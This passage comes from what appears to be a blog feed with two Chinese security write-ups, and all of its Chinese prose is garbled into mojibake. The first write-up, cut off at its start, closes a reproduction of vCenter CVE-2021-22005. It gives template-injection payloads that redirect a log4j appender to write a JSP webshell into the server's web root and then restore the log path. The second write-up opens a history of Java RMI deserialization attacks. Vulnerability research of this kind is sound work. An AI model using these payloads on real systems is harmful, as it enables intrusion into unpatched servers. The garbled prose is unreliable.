class="hljs-string">&quot;LOGFILE\&quot;</span>)</span></span>)##<br>$narfazj.setFile(\&quot;/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/xxx.jsp\&quot;)<br></code></pre></td></tr></table></figure><p>è°ƒè¯•æ— é—®é¢˜ï¼š</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/80.png">  </p><p>burpæµ‹è¯•æ—¶å‘ç°å˜é‡å·²ä¿®æ”¹ï¼Œä½†æ˜¯æ–‡ä»¶å¹¶æœªç”Ÿæˆ</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/81.png">  </p><p>ç›´æ¥ä½¿ç”¨logger.info()ç­‰æ–¹æ³•æ—¶å´è¿˜æ˜¯å†™å…¥é»˜è®¤æ–‡ä»¶</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#set($log = $GLOBAL-logger.logger.parent)##</span><br><span class="hljs-variable">$log</span>.<span class="hljs-built_in">info</span>(<span class="hljs-string">&quot;logbytest&quot;</span>)<br><span class="hljs-variable">$log</span>.<span class="hljs-built_in">debug</span>(<span class="hljs-string">&quot;logbytest&quot;</span>)<br><span class="hljs-variable">$log</span>.<span class="hljs-built_in">error</span>(<span class="hljs-string">&quot;logbytest&quot;</span>)<br><span class="hljs-variable">$log</span>.warn(<span class="hljs-string">&quot;logbytest&quot;</span>)  <br></code></pre></td></tr></table></figure><p>å†æ¬¡æµ‹è¯•å‘ç°<code>_fileName</code>ä¿®æ”¹æˆåŠŸï¼Œä½†æ˜¯å¹¶æœªåˆ›å»ºjspæ–‡ä»¶ä¸”æ—¥å¿—è¿˜æ˜¯å†™åˆ°äº†åŸæ¥æ–‡ä»¶ä¸­</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/82.png">  </p><p>è¯´æ˜æ—¥å¿—å†™å…¥æ—¶å¹¶ä¸æ˜¯å–çš„<code>_fileName</code>,åé¢æ³¨æ„åˆ°ï¼š<code>_delegate.fileName</code>å˜é‡çš„å€¼ä¹Ÿæ˜¯é»˜è®¤<code>/var/log/vmware/analytics/analytics.log</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/83.png">  </p><p>æ‰¾åˆ°<code>com.vmware.log4j.appender.NonAppendingRollingFileAppender#activateOptions()</code>ä¼šå°†<code>com.vmware.log4j.appender.NonAppendingRollingFileAppender#_fileName</code>çš„å€¼åŒæ­¥ç»™<code>_delegate.fileName</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/84.png">  </p><p>å†æ¬¡å°è¯•ä¸‹ï¼š</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs leaf"><span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">set</span><span class="hljs-params">($<span class="hljs-variable">log</span> = $<span class="hljs-variable">GLOBAL</span>-<span class="hljs-variable">logger</span>.<span class="hljs-variable">logger</span>.<span class="hljs-variable">parent</span>)</span></span>##<br><span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">set</span><span class="hljs-params">($<span class="hljs-variable">narfazj</span> = $<span class="hljs-variable">log</span>.<span class="hljs-variable">getAppender</span>(<span class="hljs-string">&quot;LOGFILE&quot;</span>)</span></span>)##<br>$narfazj.setFile(&quot;/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/xxx.jsp&quot;)<br>$narfazj.activateOptions()<br></code></pre></td></tr></table></figure><p>å‘ç°å¯ä»¥å†™å…¥äº†ï¼</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/85.png">  </p><p>æ³¨æ„å†™å®Œshellä¹‹åéœ€è¦å†æ¢å¤ä¸‹fileNameå˜é‡å€¼æ—¥å¿—<code>/var/log/vmware/analytics/analytics.log</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">set</span>(<span class="hljs-variable">$log</span> = <span class="hljs-variable">$GLOBAL</span>-logger.logger.parent)<span class="hljs-comment">##</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">set</span>(<span class="hljs-variable">$narfazj</span> = <span class="hljs-variable">$log</span>.getAppender(<span class="hljs-string">&quot;LOGFILE&quot;</span>))<span class="hljs-comment">##</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">narfazj.setFile(<span class="hljs-string">&quot;/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/xxx.jsp&quot;</span>)</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">narfazj.activateOptions()</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">log.info(\&quot;&lt;%=123%&gt;\&quot;)</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">narfazj.setFile(<span class="hljs-string">&quot;/var/log/vmware/analytics/analytics.log&quot;</span>)</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">narfazj.activateOptions()</span><br></code></pre></td></tr></table></figure><p>æ–‡ç« logæ—¥å¿—è°ƒè¯•éƒ¨åˆ†å›¾ç‰‡æ˜¯åœ¨åˆ†æ1dayæ—¶æˆªçš„ï¼Œæ‰€ä»¥å›¾ä¸­çš„POCä¸ä¸Šæ–‡åˆ†æä¸å®Œå…¨ä¸€è‡´ã€‚åœ¨æµ‹è¯•pocè¿‡ç¨‹å½“ä¸­ï¼Œæ–­ç‚¹æ–­åˆ°äº†ç³»ç»Ÿå‘çš„è¯·æ±‚æ•°æ®ï¼Œæ ¹æ®è¿™ä¸ªä¹Ÿèƒ½å¾ˆå¿«å®šä½åˆ°æœ€ç»ˆçš„resourceItemToJsonLdMappingå¯¹è±¡è¿›è¡Œæ¨¡æ¿æ³¨å…¥</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/86.png"></p><p>è‡³æ­¤å®Œæˆäº†Vmware-Vcenteræ¼æ´CVE-2021-22005 çš„è¿½è¸ªå¤ç°ï¼Œå¸Œæœ›å¯¹ä½ æœ‰å¸®åŠ©ï¼</p><h2 id="4ã€å‚è€ƒ"><a href="#4ã€å‚è€ƒ" class="headerlink" title="4ã€å‚è€ƒ"></a>4ã€å‚è€ƒ</h2><p><a href="https://testbnull.medium.com/quick-note-of-vcenter-rce-cve-2021-22005-4337d5a817ee">https://testbnull.medium.com/quick-note-of-vcenter-rce-cve-2021-22005-4337d5a817ee</a></p><p><a href="https://www.vmware.com/security/advisories/VMSA-2021-0020.html">https://www.vmware.com/security/advisories/VMSA-2021-0020.html</a></p>]]></content>
    
    
    <categories>
      
      <category>æ¼æ´è¿½è¸ª</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Vmware-Vcenter</tag>
      
      <tag>æ¼æ´åˆ†æ</tag>
      
      <tag>CVE-2021-22005</tag>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è®ºRMIçš„æ”»é˜²æ¼”è¿›å²</title>
    <link href="/2022/Exploring-JAVA-RMI&#39;s-offensive-and-defensive-history/"/>
    <url>/2022/Exploring-JAVA-RMI&#39;s-offensive-and-defensive-history/</url>
    
    <content type="html"><![CDATA[<blockquote><p>å‰äº›æ—¥å­çš„ä¸€æ¬¡æ¯”èµ›ç¢°åˆ°æ”»å‡»RMIæœåŠ¡çš„æ¼æ´ï¼Œæœ€ç»ˆæ²¡æ‰“ä¸‹æ¥ã€‚å½“æ—¶ä¹Ÿè¢«å…¶ä»–ä»»åŠ¡ç¼ èº«å¯¼è‡´æ²¡æ¢ç©¶å…¶æ ¹æœ¬åŸå› ã€‚æƒ³ç€è¿‘ä¸¤å¹´å„ç§åŸºäºRMIçš„æ¼æ´åˆå¤šäº†èµ·æ¥ï¼Œè€Œæˆ‘å¯¹å…¶ä¸­æ¶‰åŠçš„å¾ˆå¤šJDKç‰ˆæœ¬é—®é¢˜ã€å®˜æ–¹ä¿®å¤ç»•è¿‡ã€åˆ†å¸ƒå¼åƒåœ¾å›æ”¶ç›¸å…³ç‰¹æ€§ã€å„ç§tricksçš„åˆ©ç”¨ç­‰éƒ½æ‡µæ‡µæ‡‚æ‡‚ã€‚è¶ç€å‡æœŸï¼Œç´¢æ€§ä¸€æ¬¡å°†RMIç›¸å…³çš„åˆ©ç”¨é—®é¢˜ææ¸…æ¥š</p></blockquote><p>æœ¬æ–‡ä¸æ¶‰åŠå¤ªå¤šDebugä»£ç çš„æµæ°´è´¦ï¼Œé‚£æ ·åªä¼šç»•æ¥ç»•å»æŠŠè‡ªå·±ç»•æ™•ã€‚è€Œæ˜¯æŒ‰ç…§Oracleçš„å®˜æ–¹ä¿®å¤ã€è¢«ç»•è¿‡ã€ä¿®å¤ã€å†ç»•è¿‡çš„æ€è·¯è¿›è¡Œåˆ†æã€‚å…¨æ–‡è®²çš„RMIæ”»å‡»å¯¹è±¡ä¸ºæ³¨å†Œä¸­å¿ƒåŠæœåŠ¡ç«¯ï¼Œè‡³äºåå‘æ“ä½œé€ æˆçš„å®¢æˆ·ç«¯åæ‰“é—®é¢˜åŸç†ç±»ä¼¼ï¼Œè¿™é‡Œä¸åšè®¨è®ºã€‚</p><p>é’ˆå¯¹RMIæœåŠ¡çš„åˆ©ç”¨æ‰‹æ³•ä¾èµ–äºç›®æ ‡ClassPathå­˜åœ¨çš„Gadgetï¼Œä»JDKæ›´æ–°å†å²æ¥çœ‹å¯åˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µï¼Œç¬¬ä¸€é˜¶æ®µæ˜¯åœ¨JEP290ä¹‹å‰ï¼Œæ”»å‡»è€…å¯ä½¿ç”¨bind&#x2F;unbind&#x2F;dirtyç­‰æ“ä½œç»‘å®šGadgetå®Œæˆåˆ©ç”¨ã€‚åœ¨ç¬¬äºŒé˜¶æ®µæ˜¯åœ¨å‘å¸ƒJEP290(JDK8u121)è‡³JDK8u241æ—¶æœŸï¼Œç”±äºJEP290 ç™½åå•çš„é™åˆ¶ï¼Œè¿›è€Œæ‰¾å‡ºäº†UnicastRefã€UnicastRemoteObjectåˆ©ç”¨é“¾å¯ç”¨äºäºŒæ¬¡ååºåˆ—åŒ–çš„æ”»å‡»æ‰‹æ³•ï¼Œä¸­é—´ä¹Ÿç©¿æ’äº†å¯¹æ¥æºåœ°å€ç­‰çš„é™åˆ¶åŠç»•è¿‡ï¼ˆCVE-2019-2684ï¼‰ã€‚è€Œç¬¬ä¸‰é˜¶æ®µæ˜¯åœ¨JDK8u241ä¹‹åï¼Œæ”»å‡»RMIæœåŠ¡å·²ç»æ— æ³•åˆ©ç”¨bind&#x2F;unbind&#x2F;dirtyç­‰å†…ç½®æ–¹æ³•å®Œæˆæ”»å‡»ï¼Œåªèƒ½å¯„å¸Œæœ›äºå¯»æ‰¾åº”ç”¨å±‚çš„å‡½æ•°æ–¹æ³•ï¼Œå½“æ–¹æ³•ä¼ é€’çš„æ˜¯Objectã€Remoteã€Mapç­‰ç±»å‹å‚æ•°æ—¶ï¼Œè¿˜æ˜¯å¯ä»¥åˆ©ç”¨å…¶ä¼ é€’æ„é€ çš„æ¶æ„å¯¹è±¡è¿›è¡Œåˆ©ç”¨ã€‚</p><h2 id="1ã€æ¦‚å¿µä»‹ç»"><a href="#1ã€æ¦‚å¿µä»‹ç»" class="headerlink" title="1ã€æ¦‚å¿µä»‹ç»"></a>1ã€æ¦‚å¿µä»‹ç»</h2><p>å…ˆäº†è§£ä¸‹RMIç›¸å…³åè¯RPCã€RMIã€JNDIã€JRMPç­‰çš„è§£é‡Š</p><p>RPC</p><blockquote><p>RPC å…¨ç§°ä¸º Remote Procedure Call(è¿œç¨‹è¿‡ç¨‹è°ƒç”¨)ï¼Œå®ƒæ˜¯ä¸€ç§è®¡ç®—æœºé€šä¿¡åè®®ï¼Œå…è®¸åƒè°ƒç”¨æœ¬åœ°æœåŠ¡ä¸€æ ·å»è°ƒç”¨è¿œç¨‹æœåŠ¡ã€‚RPCå¯ä»¥æœ‰ä¸åŒçš„å®ç°æ–¹å¼ï¼Œå¦‚RMI(è¿œç¨‹æ–¹æ³•è°ƒç”¨)ã€Hessianç­‰ã€‚å¦å¤–RPCä¸è¯­è¨€æ˜¯æ²¡æœ‰å…³ç³»çš„ï¼ŒJava rmiä½¿ç”¨çš„æ˜¯Socketé€šä¿¡ã€åŠ¨æ€ä»£ç†åå°„ã€JavaåŸç”Ÿååºåˆ—åŒ–å»å®ç°çš„RPCæ¡†æ¶ã€‚å³æœ¬æ–‡è¦è®²è§£çš„é‡ç‚¹-Java rmi</p></blockquote><p>Java RMI</p><blockquote><p>Java RMI å…¨ç¨‹ä¸ºJava Remote Method Invocation(Java è¿œç¨‹æ–¹æ³•è°ƒç”¨)ã€‚Java RMIæ˜¯ä¸“é—¨ä¸ºJavaæä¾›çš„è¿œç¨‹æ–¹æ³•è°ƒç”¨æœºåˆ¶ï¼Œè¿œç¨‹æœåŠ¡å™¨å®ç°å…·ä½“æ–¹æ³•å¹¶æä¾›æ¥å£ï¼Œæœ¬åœ°å®¢æˆ·ç«¯æ ¹æ®æ¥å£å®šä¹‰ï¼Œæä¾›å‚æ•°å³å¯è°ƒç”¨è¿œç¨‹æ–¹æ³•å¹¶è·å–æ‰§è¡Œç»“æœï¼Œå®ç°äº†è·¨åŸŸJVMå»è°ƒç”¨å¦å¤–ä¸€ä¸ªJVMçš„å¯¹è±¡æ–¹æ³•ã€‚ </p></blockquote><p>JNDI</p><blockquote><p>JNDIå…¨ç§°ä¸ºJava Naming and Directory Interface(Java å‘½åä¸ç›®å½•æ¥å£)ã€‚å‘½åæŒ‡çš„æ˜¯åœ¨ä¸€ä¸ªç›®å½•ç³»ç»Ÿå½“ä¸­ï¼Œå®ç°äº†â€æœåŠ¡åç§°-å¯¹è±¡&#x2F;å¼•ç”¨â€è¿™æ ·çš„æ˜ å°„å¯¹åº”å…³ç³»ï¼Œå½“å®¢æˆ·ç«¯æ ¹æ®åç§°å³å¯æŸ¥è¯¢åˆ°ç›¸å…³è”çš„å¯¹è±¡&#x2F;å¼•ç”¨ã€‚ç›®å½•æ˜¯ä¸€ç§ç‰¹æ®Šç±»å‹çš„å‘½åæœåŠ¡ï¼Œåœ¨å‘½åçš„åŸºç¡€ä¸Šå¢åŠ äº†â€œå±æ€§â€çš„æ¦‚å¿µï¼Œæ‰€ä»¥å®¢æˆ·ç«¯ä¹Ÿå¯ä»¥æ ¹æ®å¯¹è±¡å±æ€§æ“ä½œç­›é€‰å¯¹è±¡&#x2F;å¼•ç”¨ã€‚è¿™äº›å¯¹è±¡&#x2F;å¼•ç”¨å¯ä»¥å­˜å‚¨åœ¨ä¸åŒçš„å‘½å&#x2F;ç›®å½•æœåŠ¡å½“ä¸­ï¼Œå¦‚ä¸Šé¢æåˆ°çš„è¿œç¨‹æœåŠ¡è°ƒç”¨RMIã€å…¬å…±å¯¹è±¡è¯·æ±‚ä»£ç†æ¶æ„CORBAã€è½»é‡çº§ç›®å½•è®¿é—®åè®®LDAPã€åŸŸåæœåŠ¡DNS</p></blockquote><p>JRMP</p><blockquote><p>JRMPå…¨ç§°ä¸ºJava Remote Method Protocalï¼ˆJava è¿œç¨‹æ–¹æ³•åè®®ï¼‰ã€‚Javaæœ¬èº«å¯¹äºRMIçš„å®ç°é»˜è®¤ä½¿ç”¨JRMPåè®®ï¼Œè€Œæœ€è¿‘å‡ å¹´çš„æ¼æ´ä¹‹ç‹-Weblogicå¯¹äºRMIçš„å®ç°ä½¿ç”¨çš„æ˜¯T3åè®®ã€‚ä¸€æ¬¡Java RMIçš„è¿‡ç¨‹ï¼Œéœ€è¦ç”¨åˆ°JRMPåè®®å»ç»„ç»‡æ•°æ®æ ¼å¼ç„¶åé€šè¿‡TCPåè®®è¿›è¡Œä¼ è¾“ï¼Œè¾¾åˆ°è¿œç¨‹æ–¹æ³•è°ƒç”¨çš„ç›®çš„</p></blockquote><p>2ã€RMIè°ƒç”¨åŸºæœ¬æµç¨‹</p><blockquote><p>ä¸€æ¬¡å®Œæ•´çš„RMIè°ƒç”¨æ¶‰åŠåˆ°æ³¨å†Œä¸­å¿ƒRegistryã€æœåŠ¡ç«¯Serverã€å®¢æˆ·ç«¯Clientä¸‰ç«¯ï¼ŒæœåŠ¡ç«¯é¦–å…ˆå‘æ³¨å†Œä¸­å¿ƒæ³¨å†Œåˆ›å»ºçš„è¿œç¨‹å¯¹è±¡ï¼ˆä¸‹å›¾ç¬¬ä¸€äºŒæ­¥ï¼‰ï¼Œæ¥ç€å®¢æˆ·ç«¯å‘æ³¨å†Œä¸­å¿ƒå‘èµ·æŸ¥æ‰¾è¯·æ±‚å¹¶æ‹¿åˆ°è¿œç¨‹å¯¹è±¡çš„å­˜æ ¹ï¼ˆä¸‹å›¾ç¬¬ä¸‰å››æ­¥ï¼‰ã€‚RMIçš„å®ç°å¼•å…¥äº†Stubs(å®¢æˆ·ç«¯å­˜æ ¹)ã€Skeletons(æœåŠ¡ç«¯éª¨æ¶)ä¸¤ä¸ªæ¦‚å¿µã€‚å½“å®¢æˆ·ç«¯è°ƒç”¨è¿œç¨‹æœåŠ¡ç«¯çš„å¯¹è±¡æ–¹æ³•æ—¶ï¼ˆä¸‹å›¾ç¬¬äº”æ­¥ï¼‰ï¼Œå®é™…ä¸Šä¼šå…ˆç»è¿‡â€œè¿œç¨‹å¯¹è±¡çš„å®¢æˆ·æœ¬åœ°ä»£ç†â€ï¼Œè¿™ä¸ªä»£ç†ç±»å°±æ˜¯Stubs(å®¢æˆ·ç«¯å­˜æ ¹)ï¼Œå…¶ä¸»è¦è´Ÿè´£å°†è¦è°ƒç”¨çš„è¿œç¨‹æ–¹æ³•ååŠå‚æ•°æ‰“åŒ…ã€å¹¶å°†è¯¥åŒ…è½¬å‘ç»™è¿œç¨‹å¯¹è±¡æ‰€åœ¨çš„æœåŠ¡å™¨ï¼ˆä¸‹å›¾ç¬¬å…­æ­¥ï¼‰ï¼›è€Œåœ¨è¿œç¨‹æœåŠ¡å™¨è°ƒç”¨çœŸæ­£çš„æ–¹æ³•ä¹‹å‰ï¼ŒåŒæ ·ä¹Ÿä¼šç»è¿‡ä»£ç†ç±»ï¼Œè¿™ä¸ªå­˜åœ¨äºæœåŠ¡ç«¯çš„ä»£ç†ç±»å°±æ˜¯éª¨æ¶Skeletonï¼Œå®ƒä»Stubsä¸­æ¥å—è°ƒç”¨å¹¶ä¼ é€’ç»™çœŸå®çš„ç›®æ ‡æ–¹æ³•ï¼ˆä¸‹å›¾ç¬¬ä¸ƒæ­¥ï¼‰ã€‚ä¸¤è€…å¯¹äºRMIæœåŠ¡çš„ä½¿ç”¨è€…æ˜¯éšè—çš„ï¼Œä½¿ç”¨è€…ä¸éœ€è¦å…³æ³¨è¿™éƒ¨åˆ†å®ç°ã€‚å¦‚ä¸‹å›¾æ˜¯ä¸€æ¬¡RMIçš„è°ƒç”¨è¿‡ç¨‹</p></blockquote><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/1.png"></p><p>äº†è§£äº†RMIçš„è°ƒç”¨è¿‡ç¨‹ï¼Œæˆ‘ä»¬è¿˜éœ€è¦çŸ¥é“ï¼šRMIè¿‡ç¨‹ä¸­ä¼ è¾“çš„æ•°æ®å‡ä¸ºåºåˆ—åŒ–æ•°æ®ï¼ŒæœåŠ¡ç«¯&#x2F;å®¢æˆ·ç«¯&#x2F;æ³¨å†Œä¸­å¿ƒåœ¨æ‹¿åˆ°æ•°æ®åéƒ½ä¼šè¿›è¡Œååºåˆ—åŒ–æ“ä½œã€‚å¦‚æœä¼ è¾“çš„æ˜¯æˆ‘ä»¬æ„é€ å¥½çš„æ¶æ„åºåˆ—åŒ–æ•°æ®ï¼Œå°±ä¼šåœ¨ååºåˆ—åŒ–æ—¶è§¦å‘æ¼æ´ã€‚å…³äºRMIçš„å¤§éƒ¨åˆ†æ”»å‡»éƒ½æ˜¯åŸºäºæ­¤ç‰¹æ€§å®Œæˆçš„ï¼Œä¸»è¦åˆ†ä¸ºï¼šæœåŠ¡ç«¯å‘æ³¨å†Œä¸­å¿ƒçš„bindæ“ä½œã€å®¢æˆ·ç«¯å‘æ³¨å†Œä¸­å¿ƒçš„lookupæ“ä½œã€å®¢æˆ·ç«¯å‘æœåŠ¡ç«¯è°ƒç”¨â€œè‡ªå®šä¹‰æ–¹æ³•â€çš„æ“ä½œã€‚æ¼æ´åˆ©ç”¨åœ¨æ­¤åŸºç¡€ä¸Šå®Œæˆã€‚æœ¬æ–‡ä¸»è¦è®¨è®ºçš„æ˜¯å¯¹äºæ³¨å†Œä¸­å¿ƒ&#x2F;æœåŠ¡ç«¯çš„æ¼æ´åˆ©ç”¨åœ¨JDKä¸­çš„çš„æ”»é˜²å†å²ï¼Œæ¶‰åŠå¤šä¸ªJDKç‰ˆæœ¬ã€ååºåˆ—åŒ–Gadgetæ„é€ æŠ€å·§ã€å®˜æ–¹çš„ä¿®å¤ä¸ç»•è¿‡ç­‰ç­‰çŸ¥è¯†ã€‚</p><p>æ–‡ç« ä¸­ä½¿ç”¨çš„JDKç‰ˆæœ¬ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">jdk8u112ã€jdk8u121ã€jdk8u141ã€jdk8u191ã€jdk8u231ã€jdk8u241<br></code></pre></td></tr></table></figure><h2 id="2ã€JAVA-RMIä¸JDKçš„æ”»é˜²å²"><a href="#2ã€JAVA-RMIä¸JDKçš„æ”»é˜²å²" class="headerlink" title="2ã€JAVA RMIä¸JDKçš„æ”»é˜²å²"></a>2ã€JAVA RMIä¸JDKçš„æ”»é˜²å²</h2><h3 id="1ã€jdk-lt-8u121-æ— ä»»ä½•è¿‡æ»¤"><a href="#1ã€jdk-lt-8u121-æ— ä»»ä½•è¿‡æ»¤" class="headerlink" title="1ã€jdk&lt; 8u121 æ— ä»»ä½•è¿‡æ»¤"></a>1ã€jdk&lt; 8u121 æ— ä»»ä½•è¿‡æ»¤</h3><h4 id="1-1-bind-x2F-rebind-çš„åˆ©ç”¨"><a href="#1-1-bind-x2F-rebind-çš„åˆ©ç”¨" class="headerlink" title="1.1 bind&#x2F;rebind çš„åˆ©ç”¨"></a>1.1 bind&#x2F;rebind çš„åˆ©ç”¨</h4><p>æœåŠ¡ç«¯ä½¿ç”¨bindå‘æ³¨å†Œä¸­å¿ƒæ³¨å†Œç»‘å®šè¿œç¨‹å¯¹è±¡ï¼Œæˆ‘ä»¬å¯ä»¥æ”¾ç½®æ¶æ„å¯¹è±¡å®Œæˆåˆ©ç”¨</p><p>sun.rmi.registry.RegistryImpl_Skel#dispatch</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/2.png"></p><p>æ³¨å†Œä¸­å¿ƒç«¯çš„RegistryImpl_Skelä¼šç›´æ¥å¯¹æœåŠ¡ç«¯ bind&#x2F;rebindæ“ä½œä¼ è¾“è¿‡æ¥çš„å¯¹è±¡è¿›è¡Œååºåˆ—åŒ–è€Œæ²¡æœ‰ä»»ä½•è¿‡æ»¤ã€‚æ‰€ä»¥åœ¨JDK8u121ä¹‹å‰å¯ä»¥ç›´æ¥ä½¿ç”¨bind&#x2F;rebindæ“ä½œä¼ è¾“æ¶æ„å¯¹è±¡è¿›è¡Œæ¼æ´åˆ©ç”¨ã€‚è¿™ä¹Ÿæ˜¯ysoserial.exploit.RMIRegistryExploit åˆ©ç”¨çš„åŸç†ã€‚å› ä¸ºbindä¼ è¾“çš„ç±»å¿…é¡»å®ç°Remoteæ¥å£ï¼Œå¯ä½¿ç”¨åŠ¨æ€ä»£ç†çš„æ–¹å¼è¿›è¡Œè§£å†³ï¼Œysoserialä½¿ç”¨çš„handlerä¸ºAnnotationInvocationHandler</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/3.png"></p><h4 id="1-2-DGC-dirty-çš„åˆ©ç”¨"><a href="#1-2-DGC-dirty-çš„åˆ©ç”¨" class="headerlink" title="1.2 DGC#dirty çš„åˆ©ç”¨"></a>1.2 DGC#dirty çš„åˆ©ç”¨</h4><p>å› ä¸ºåœ¨è·¨è™šæ‹Ÿæœºçš„æƒ…å†µä¸‹ï¼ŒRMIæ— æ³•ç›´æ¥ä½¿ç”¨åŸæœ‰JDKçš„GCæœºåˆ¶ï¼Œè€Œè‡ªå·±å®ç°äº†DGCï¼ˆDistributed  Garbage Collection åˆ†å¸ƒå¼åƒåœ¾å›æ”¶ï¼‰ï¼Œåœ¨å¯¹RMIè¿›è¡Œæ¼æ´åˆ©ç”¨çš„æ—¶å€™ï¼Œä¹Ÿä¼šå‡ºç°ç»å¸¸å‡ºç°DGCçš„èº«å½±ã€‚ä¸ä¸Šé¢RMIæµç¨‹å›¾ä¸­æåˆ°çš„ä¸€æ ·ï¼ŒDGCä¹Ÿå…·æœ‰Stubs(å®¢æˆ·ç«¯å­˜æ ¹)ã€Skeletons(æœåŠ¡ç«¯éª¨æ¶)ä¸¤ä¸ªæ¦‚å¿µï¼Œæ¶‰åŠçš„ç±»ä¸ºï¼šDGCImpl_Stubã€DGCImpl_Skelã€‚å¹¶ä¸”åªè¦å¯åŠ¨äº†RMIæœåŠ¡ï¼Œé‚£ä¹ˆä¸€å®šä¼šå­˜åœ¨DGCï¼Œå…¶ä¼ è¾“çš„æ•°æ®æ˜¯åºåˆ—åŒ–æ•°æ®ï¼Œå‚æ•°ObjIDä¸ºObjectç±»å‹ï¼Œå¯ä»¥æ”¾ç½®æˆ‘ä»¬çš„æ¶æ„payloadã€‚åœ¨ysoserialä¸­ï¼ŒDGCå¯¹åº”çš„åˆ©ç”¨expä¸ºysoserial&#x2F;exploit&#x2F;JRMPClientï¼Œä»¥ä¸‹ä¸ºç»†èŠ‚åˆ†æ</p><p>å¤„ç†DGCæ“ä½œçš„æ˜¯sun.rmi.transport.DGCImpl_Skel#dispatchæ–¹æ³•</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/4.png"></p><p>æ ¹æ®ä¼ å…¥çš„var3å€¼å†³å®šæ˜¯è°ƒç”¨cleanï¼ˆ0ï¼‰æ“ä½œè¿˜æ˜¯dirtyï¼ˆ1ï¼‰æ“ä½œï¼Œåœ¨è°ƒç”¨çœŸæ­£çš„è¿œç¨‹æ–¹æ³•ä¹‹å‰ä¼šä½¿ç”¨readObject()è·å–å‚æ•°å€¼ï¼Œå³è¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œè¿™ä¹Ÿæ˜¯è¯¥æ¼æ´çš„è§¦å‘ç‚¹ã€‚è€ŒEXPç¼–å†™çš„é‡ç‚¹æ˜¯å¦‚ä½•æŠŠæˆ‘ä»¬æ„é€ çš„æ¶æ„åºåˆ—åŒ–æ•°æ®å¡è¿›å»ã€‚è¿™æ¶‰åŠåˆ°DGCé€šä¿¡çš„ä¸€äº›åè®®æ ¼å¼ï¼Œæˆ‘ä»¬è¦è§£å†³çš„é—®é¢˜æœ¬è´¨ä¸Šæ¥è¯´å°±æ˜¯ï¼š<strong>æ¨¡ä»¿å®¢æˆ·ç«¯é€šä¿¡ï¼Œå°†æ„é€ çš„æ¶æ„æ•°æ®å¡å…¥æ•°æ®æµï¼Œä½¿å¾—æœåŠ¡ç«¯é€šè¿‡ååºåˆ—åŒ–æ“ä½œè·å–ObjIDå‚æ•°å€¼æ—¶è§¦å‘æ¼æ´</strong>ã€‚å¹¶ä¸”ç”±äºDGCå¯¹äºRMIä½¿ç”¨ç”¨æˆ·æ¥è¯´å¹¶ä¸å¯è§ï¼Œæ— æ³•åƒregistryå¯ä»¥ç›´æ¥è¿æ¥å»è°ƒç”¨å†…ç½®æ–¹æ³•ï¼Œè€Œæ˜¯éœ€è¦è‡ªå·±èµ·socketè¯·æ±‚ï¼ŒæŒ‰ç…§æ•°æ®æ ¼å¼è¿›è¡Œæ•°æ®å¡«å……ã€‚</p><p>å‚è€ƒ<a href="https://docs.oracle.com/javase/9/docs/specs/rmi/protocol.html">rmi-protocol-docs</a>å‘é€çš„æŠ¥æ–‡æ ¼å¼å¦‚ä¸‹ã€‚æœåŠ¡ç«¯åœ¨æ¥æ”¶åˆ°å®¢æˆ·ç«¯ä¼ è¾“çš„æ•°æ®åï¼Œä¾æ¬¡è§£æç¡®è®¤operationæŒ‡ä»¤(Callã€Pingã€DgcAck)ã€æ ¹æ®ObjIDç¡®è®¤å¤„ç†çš„Skelç±»(RegistryImpl_Skel&#x2F;DGCImpl_Skel&#x2F;è‡ªå®šä¹‰)ã€æ ¹æ®num&#x2F;hashç¡®è®¤è¦è°ƒç”¨çš„æ–¹æ³•ã€argä¸ºè°ƒç”¨æ–¹æ³•çš„å‚æ•°å€¼ã€‚å…¶ä¸­ObjIDã€numã€hashã€argéƒ½æ˜¯åŸºäºJAVAåŸç”Ÿåºåˆ—åŒ–æœºåˆ¶ç”Ÿæˆçš„åºåˆ—åŒ–æ•°æ®</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/5.png"></p><p>Headeré»˜è®¤å€¼éƒ¨åˆ†åœ¨TransportConstantsä¸­å®šä¹‰ï¼Œå…¶ä¸­æ–‡æ¡£ä¸­çš„<code>0x4a 0x52 0x4d 0x49</code> 